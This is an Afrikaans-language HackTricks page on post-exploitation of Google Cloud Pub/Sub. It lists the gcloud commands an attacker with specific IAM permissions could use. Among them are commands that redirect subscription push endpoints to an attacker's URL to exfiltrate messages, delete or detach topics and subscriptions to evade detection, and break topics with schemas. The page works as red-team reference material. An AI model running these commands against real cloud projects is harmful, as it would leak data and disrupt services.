# GCP - Pub/Sub Post Exploitation

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**intekenplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repo's.

</details>
{% endhint %}

## Pub/Sub

Vir meer inligting oor Pub/Sub, kyk na die volgende bladsy:

{% content-ref url="../gcp-services/gcp-pub-sub.md" %}
[gcp-pub-sub.md](../gcp-services/gcp-pub-sub.md)
{% endcontent-ref %}

### `pubsub.topics.publish`

Publiseer 'n boodskap in 'n onderwerp, nuttig om **onverwagte data te stuur** en onverwagte funksionaliteite te aktiveer of kwesbaarhede uit te buit:
```bash
# Publish a message in a topic
gcloud pubsub topics publish <topic_name> --message "Hello!"
```
### `pubsub.topics.detachSubscription`

Nuttig om te verhoed dat 'n intekening boodskappe ontvang, miskien om opsporing te vermy.
```bash
gcloud pubsub topics detach-subscription <FULL SUBSCRIPTION NAME>
```
### `pubsub.topics.delete`

Nuttig om te voorkom dat 'n intekening boodskappe ontvang, miskien om opsporing te vermy.\
Dit is moontlik om 'n onderwerp te verwyder selfs met intekeninge daaraan gekoppel.
```bash
gcloud pubsub topics delete <TOPIC NAME>
```
### `pubsub.topics.update`

Gebruik hierdie toestemming om 'n instelling van die onderwerp op te dateer om dit te ontwrig, soos `--clear-schema-settings`, `--message-retention-duration`, `--message-storage-policy-allowed-regions`, `--schema`, `--schema-project`, `--topic-encryption-key`...

### `pubsub.topics.setIamPolicy`

Gee jouself toestemming om enige van die vorige aanvalle uit te voer.

### **`pubsub.subscriptions.create,`**`pubsub.topics.attachSubscription` , (`pubsub.subscriptions.consume`)

Kry al die boodskappe in 'n webbediener:

{% code overflow="wrap" %}
```bash
# Crete push subscription and recieve all the messages instantly in your web server
gcloud pubsub subscriptions create <subscription name> --topic <topic name> --push-endpoint https://<URL to push to>
```
{% endcode %}

Skep 'n intekening en gebruik dit om **boodskappe te trek**:
```bash
# This will retrive a non ACKed message (and won't ACK it)
gcloud pubsub subscriptions create <subscription name> --topic <topic_name>

# You also need pubsub.subscriptions.consume for this
gcloud pubsub subscriptions pull <FULL SUBSCRIPTION NAME>
## This command will wait for a message to be posted
```
### `pubsub.subscriptions.delete`

**Verwyder 'n intekening** kan nuttig wees om 'n logverwerkingsisteem of iets soortgelyks te ontwrig:
```bash
gcloud pubsub subscriptions delete <FULL SUBSCRIPTION NAME>
```
### `pubsub.subscriptions.update`

Gebruik hierdie toestemming om 'n instelling op te dateer sodat boodskappe gestoor word op 'n plek waartoe jy toegang het (URL, Big Query tabel, Emmer) of net om dit te ontwrig.

{% code overflow="wrap" %}
```bash
gcloud pubsub subscriptions update --push-endpoint <your URL> <subscription-name>
```
{% endcode %}

### `pubsub.subscriptions.setIamPolicy`

Gee jouself die regte om enige van die voorheen genoemde aanvalle uit te voer.

### `pubsub.schemas.attach`, `pubsub.topics.update`,(`pubsub.schemas.create`)

Heg 'n skema aan 'n onderwerp sodat die boodskappe dit nie nakom nie en dus die onderwerp ontwrig word.\
As daar geen skemas is nie, moet jy dalk een skep.

{% code title="schema.json" %}
```json
{
"namespace": "com.example",
"type": "record",
"name": "Person",
"fields": [
{
"name": "name",
"type": "string"
},
{
"name": "age",
"type": "int"
}
]
}
```
{% endcode %}
```bash
# Attach new schema
gcloud pubsub topics update projects/<project-name>/topics/<topic-id> \
--schema=projects/<project-name>/schemas/<topic-id> \
--message-encoding=json
```
### `pubsub.schemas.delete`

Dit mag lyk asof jy 'n skema uitvee, jy boodskappe sal kan stuur wat nie aan die skema voldoen nie. Maar, aangesien die skema uitgevee sal word, sal geen boodskap eintlik binne die onderwerp ingaan nie. So dit is **NUTTELOOS**:
```bash
gcloud pubsub schemas delete <SCHEMA NAME>
```
### `pubsub.schemas.setIamPolicy`

Gee jouself die toestemmings wat nodig is om enige van die voorheen genoemde aanvalle uit te voer.

### `pubsub.snapshots.create`, `pubsub.snapshots.seek`

Dit sal 'n snapshot van al die onACKed boodskappe skep en dit terug na die intekening plaas. Nie baie nuttig vir 'n aanvaller nie, maar hier is dit:
```bash
gcloud pubsub snapshots create YOUR_SNAPSHOT_NAME \
--subscription=YOUR_SUBSCRIPTION_NAME
gcloud pubsub subscriptions seek YOUR_SUBSCRIPTION_NAME \
--snapshot=YOUR_SNAPSHOT_NAME
```
{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**intekenplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking tricks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
